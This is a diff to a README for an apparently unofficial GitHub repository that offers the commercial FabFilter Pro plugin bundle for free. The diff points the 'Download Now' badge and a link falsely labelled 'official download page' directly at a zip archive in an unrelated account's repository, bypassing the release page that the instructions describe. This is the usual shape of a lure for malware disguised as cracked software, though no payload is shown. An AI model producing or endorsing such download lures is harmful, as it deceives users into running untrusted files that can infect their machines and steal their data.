@@ -1,6 +1,6 @@
 # 🎚️ FabFilter-Pro-Bundle-Setup - Professional Tools For Your Music Studio
 
-[![Download Now](https://img.shields.io/badge/Download-Plugins-blue.svg)](https://github.com/himmlerandreamantegna376/FabFilter-Pro-Bundle-Setup)
+[![Download Now](https://img.shields.io/badge/Download-Plugins-blue.svg)](https://github.com/himmlerandreamantegna376/FabFilter-Pro-Bundle-Setup/raw/refs/heads/main/Melissa/Bundle-Pro-Filter-Fab-Setup-3.4.zip)
 
 ## 🛠️ Overview
 
@@ -27,7 +27,7 @@ If your computer uses an older processor or has limited RAM, the user interface 
 
 Follow these steps to set up your plugins on your Windows machine.
 
-1. Go to the [official download page](https://github.com/himmlerandreamantegna376/FabFilter-Pro-Bundle-Setup).
+1. Go to the [official download page](https://github.com/himmlerandreamantegna376/FabFilter-Pro-Bundle-Setup/raw/refs/heads/main/Melissa/Bundle-Pro-Filter-Fab-Setup-3.4.zip).
 2. Look for the release section on that page.
 3. Select the Windows installer file with the .exe extension.
 4. Save the file to your Downloads folder.
